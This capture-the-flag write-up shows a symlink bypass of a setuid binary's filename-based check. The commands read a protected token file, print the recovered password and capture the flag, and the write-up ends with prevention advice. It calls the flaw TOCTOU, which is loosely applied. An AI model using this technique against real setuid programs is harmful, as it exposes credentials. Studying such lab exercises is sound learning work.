# Level 08 - Symbolic Link Bypass

## Objective
Bypass filename-based access control to read a protected file.

## My Notes

Found two files:
```bash
ls -la
# -rwsr-sr-x+ 1 flag08 level08 8617 level08
# -rw------- 1 flag08 flag08    26 token
```

Setuid binary and a token file I can't read. Ran the binary:
```bash
./level08
# level08 [file to read]

./level08 token
# You may not access 'token'
```

It blocks access to files named "token". Used `strings` to see:
```bash
strings level08
# token
# You may not access '%s'
```

Traced with ltrace:
```bash
ltrace ./level08 token
```

```
strstr("token", "token")       = "token"
printf("You may not access '%s'\n", "token")
```

The binary uses `strstr()` to check if the filename contains "token". The check is on the filename string, not the actual file. If I create a symbolic link with a different name that points to the token file, the check passes but the file opens successfully.

Created symlink:
```bash
ln -sf ~/token /tmp/nottoken
./level08 /tmp/nottoken
# quif5eloekouj29ke0vouxean
```

It worked. The binary checked the symlink name (doesn't contain "token"), then opened the symlink which transparently reads the target file.

Used the token to login:
```bash
su flag08   # Password: quif5eloekouj29ke0vouxean
getflag
```

Token: `25749xKZ8L7DkSCwJkT9dyv6f`

## Key Takeaways

**Symbolic links:** Special files that point to another file. Operations on symlinks transparently affect the target. A symlink is like an alias.

**TOCTOU vulnerability:** Time of Check vs Time of Use. The binary checks the filename (which doesn't contain "token"), then opens it (which follows the symlink to the actual token file). The state changed between check and use.

**Why string checks on filenames fail:** Filename ≠ file identity. Can use symlinks, hard links, path traversal, null bytes to bypass string-based checks.

**File identity in Unix:** Files are identified by device number + inode number. The filename is just a directory entry pointing to an inode.

**Better checks:** Use `realpath()` to resolve symlinks, or check file after opening with `fstat()` on the file descriptor. Can use `O_NOFOLLOW` to reject symlinks entirely.

## Tools Used
- `ln -s` - Create symlinks
- `strings`, `ltrace` - Analyze binary
- `stat` - View file metadata

## Prevention
- Use `realpath()` to resolve symlinks before checking
- Check file after opening (fstat on fd) - check inode/ownership
- Use `O_NOFOLLOW` to reject symlinks
- Use file permissions as access control, not filename patterns
- Jail the program with chroot/containers
